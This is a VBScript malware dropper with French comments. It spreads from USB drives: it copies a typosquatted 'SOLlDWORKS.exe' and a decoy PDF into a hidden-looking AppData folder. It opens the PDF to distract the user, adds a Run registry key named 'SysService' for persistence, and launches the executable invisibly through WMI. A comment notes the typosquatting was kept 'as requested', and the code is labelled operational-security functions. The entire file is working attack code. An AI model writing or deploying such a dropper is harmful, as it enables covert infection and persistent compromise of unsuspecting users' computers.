Option Explicit

Dim fso, shell, app, wmi
Set fso   = CreateObject("Scripting.FileSystemObject")
Set shell = CreateObject("WScript.Shell")
Set app   = CreateObject("Shell.Application")
Set wmi   = GetObject("winmgmts:\\.\root\cimv2")

' --- CONFIGURATION DYNAMIQUE ---
Dim userPath, targetDir, exeName, pdfName, regKey
exeName = "SOLlDWORKS.exe" ' Note: Typosquatting maintenu selon demande
pdfName = "modèles.pdf"
regKey  = "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\SysService"

' Utilisation de variables d'environnement pour éviter les erreurs de chemins longs ou spéciaux
userPath  = shell.ExpandEnvironmentStrings("%LOCALAPPDATA%") 
targetDir = userPath & "\Microsoft\Windows\Data\" ' Chemin standardisé discret

' --- INITIALISATION ---
Main()

Sub Main()
    On Error Resume Next
    
    ' 1. Création récursive du répertoire (évite les erreurs de dossier manquant)
    CreateFolderTree targetDir

    ' 2. Recherche et Copie (USB vers Local)
    Dim srcEXE, srcPDF
    srcEXE = FindFile(exeName)
    srcPDF = FindFile(pdfName)

    ' Déploiement des actifs
    If srcEXE <> "" Then RobustCopy srcEXE, targetDir & exeName
    If srcPDF <> "" Then RobustCopy srcPDF, targetDir & pdfName

    ' 3. Exécution Double Flux
    If fso.FileExists(targetDir & pdfName) Then
        ' Ouverture du PDF (Visible pour l'utilisateur)
        shell.Run "cmd /c start """" """ & targetDir & pdfName & """", 1, False
    End If

    If fso.FileExists(targetDir & exeName) Then
        ' Installation de la persistance registre
        shell.RegWrite regKey, """" & targetDir & exeName & """", "REG_SZ"
        
        ' EXÉCUTION FURTIVE (Fenêtre cachée = 0)
        ' Utilisation de WMI pour un lancement sans lien direct avec le script parent
        Dim process, startup
        Set startup = wmi.Get("Win32_ProcessStartup").SpawnInstance_
        startup.ShowWindow = 0 ' Mode furtif total
        wmi.Get("Win32_Process").Create targetDir & exeName, targetDir, startup, process
    End If

    ' Nettoyage final
    Set fso = Nothing : Set shell = Nothing : Set app = Nothing
End Sub

' --- FONCTIONS DE SÉCURITÉ OPÉRATIONNELLE ---

Sub CreateFolderTree(path)
    Dim parts, i, current
    parts = Split(path, "\")
    current = ""
    For i = 0 To UBound(parts)
        If parts(i) <> "" Then
            current = current & parts(i) & "\"
            If Not fso.FolderExists(current) Then fso.CreateFolder(current)
        End If
    Next
End Sub

Function FindFile(fileName)
    Dim drv, drives
    ' Priorité 1 : Dossier actuel du script
    If fso.FileExists(fso.GetParentFolderName(WScript.ScriptFullName) & "\" & fileName) Then
        FindFile = fso.GetParentFolderName(WScript.ScriptFullName) & "\" & fileName
        Exit Function
    End If
    ' Priorité 2 : Lecteurs amovibles
    Set drives = fso.Drives
    For Each drv In drives
        If drv.DriveType = 1 And drv.IsReady Then
            If fso.FileExists(drv.DriveLetter & ":\" & fileName) Then
                FindFile = drv.DriveLetter & ":\" & fileName
                Exit Function
            End If
        End If
    Next
    FindFile = ""
End Function

Sub RobustCopy(src, dest)
    On Error Resume Next
    If fso.FileExists(src) Then
        fso.CopyFile src, dest, True
    End If
End Sub
